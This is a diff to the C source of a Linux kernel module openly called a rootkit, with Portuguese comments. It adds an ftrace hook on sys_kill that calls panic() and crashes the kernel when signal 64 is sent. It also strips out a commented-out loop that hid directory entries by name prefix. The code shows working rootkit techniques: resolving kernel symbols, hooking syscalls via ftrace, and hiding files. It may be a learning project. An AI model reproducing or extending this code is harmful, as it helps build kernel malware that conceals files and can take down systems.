@@ -62,6 +62,7 @@ static unsigned long * __sys_call_table; // endereco da nossa tabela de syscall
 // serem passados como unico argumento pra syscall
 // em ptrace.h, a struct e' definido de forma que cada registrador tem seu nome comum, sem o prefixo (rsi -> si)
 asmlinkage long (*orig_func)(const struct pt_regs *);
+asmlinkage long (*orig_kill)(const struct pt_regs *);
 asmlinkage int hook_mkdir(const struct pt_regs *regs);
 asmlinkage int hook_kill(struct pt_regs *regs);
 asmlinkage int hook_func(const struct pt_regs *regs);
@@ -81,13 +82,14 @@ asmlinkage int hook_kill(struct pt_regs *regs) {
     int sig = regs->si;
 
     if (sig == 64) {
-        printk(KERN_ALERT "rootkit: sinal especial recebido!!!\n");
-        regs->si = SIGINT;
-        return orig_func(regs);
+        // printk(KERN_ALERT "rootkit: sinal especial recebido!!!\n");
+        // regs->si = SIGINT;
+        // return orig_func(regs);
+        panic("OMG");
     }
     else {
         if (sig) printk(KERN_INFO "rootkit: sinal comum recebido: %d\n", sig);
-        return orig_func(regs);
+        return orig_kill(regs);
     }
 }
 
@@ -129,42 +131,6 @@ asmlinkage int hook_func(const struct pt_regs *regs)
     }
     error = copy_to_user(dirent, dirent_ker, ret);
     if (error) goto done;
-
-    // while (offset < ret)
-    // {
-    //     current_dir = (void *)dirent_ker + offset;
-    //
-    //     printk(KERN_INFO "rootkit: diretorio atual: %s\n", current_dir->d_name);
-    //     if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
-    //     {
-    //         // printk(KERN_INFO "rootkit: match!\n");
-            // /* Check for the special case when we need to hide the first entry */
-            // if( current_dir == dirent_ker )
-            // {
-            //     /* Decrement ret and shift all the structs up in memory */
-            //     ret -= current_dir->d_reclen;
-            //     memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-            //     continue;
-            // }
-            // /* Hide the secret entry by incrementing d_reclen of previous_dir by
-            //  * that of the entry we want to hide - effectively "swallowing" it
-            //  */
-            // previous_dir->d_reclen += current_dir->d_reclen;
-        // }
-        // else
-        // {
-            /* Set previous_dir to current_dir before looping where current_dir
-             * gets incremented to the next entry
-             */
-    //         previous_dir = current_dir;
-    //     }
-    //
-    //     offset += current_dir->d_reclen;
-    // }
-
-    // error = copy_to_user(dirent, dirent_ker, ret);
-    // if(error)
-    //     goto done;
 
 done:
     kfree(dirent_ker);
@@ -225,6 +191,7 @@ static int __init rootkit_init(void) {
     
     // buscar o endereco original da funcao pra poder usar no meio do hook
     orig_func = (long int (*)(const struct pt_regs*))kln(ROOTKIT_FUNC);
+    orig_kill = (long int (*)(const struct pt_regs*))kln(NOME_SYSCALL("sys_kill"));
     // hook = {.name = "vfs_mkdir", .function = (void*)hook_mkdir, .original = &orig_mkdir};
     // nome da syscall que queremos pegar
     hook1.name = ROOTKIT_FUNC;
@@ -237,14 +204,32 @@ static int __init rootkit_init(void) {
     // respectivamente: salvar o contexto dos regs; protecao contra recursao; modificar o ponteiro de instrucao
     hook1.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
 
+    hook2.name = "sys_kill";
+    hook2.function = (void*)hook_kill;
+    hook2.original = &orig_kill;
+    hook2.ops.func = fh_ftrace_thunk;
+    hook2.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;
+
     int err;
     err = ftrace_set_filter(&hook1.ops, ROOTKIT_FUNC, strlen(ROOTKIT_FUNC), 0);
     // err = ftrace_set_filter_ip(&hook.ops, hook.address, 0, 0);
     if (err) {
-        printk(KERN_ERR "rootkit: ftrace_set_filter() falhou; err = %d\n", err);
+        printk(KERN_ERR "rootkit: ftrace_set_filter1() falhou; err = %d\n", err);
         return err;
     }
+    err = ftrace_set_filter(&hook2.ops, NOME_SYSCALL("sys_kill"), strlen(NOME_SYSCALL("sys_kill")), 0);
+    // err = ftrace_set_filter_ip(&hook.ops, hook.address, 0, 0);
+    if (err) {
+        printk(KERN_ERR "rootkit: ftrace_set_filter2() falhou; err = %d\n", err);
+        return err;
+    }
+ 
     err = register_ftrace_function(&hook1.ops);
+    if (err) {
+        printk(KERN_ERR "rootkit: register_ftrace_function() falhou; err = %d\n", err);
+        return err;
+    }
+    err = register_ftrace_function(&hook2.ops);
     if (err) {
         printk(KERN_ERR "rootkit: register_ftrace_function() falhou; err = %d\n", err);
         return err;
@@ -275,7 +260,11 @@ static void __exit rootkit_exit(void) {
     {
         printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
     }
-
+    err = unregister_ftrace_function(&hook2.ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+    }
     // err = ftrace_set_filter_ip(&hook.ops, hook.address, 1, 0);
     // if(err)
     // {
